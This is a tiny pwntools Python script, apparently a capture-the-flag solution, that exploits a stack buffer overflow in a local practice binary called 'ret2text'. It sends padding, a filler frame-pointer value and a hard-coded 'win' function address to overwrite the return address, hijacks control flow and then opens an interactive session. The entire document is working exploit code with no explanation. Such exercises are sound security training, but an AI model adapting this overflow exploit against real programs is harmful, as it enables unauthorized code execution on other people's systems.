from pwn import *

sh = process("./ret2text")
whatever = 0xcafebabe
win = 0x8048456
sh.sendline(b'A'*20 + p32(whatever) + p32(win))
sh.interactive()
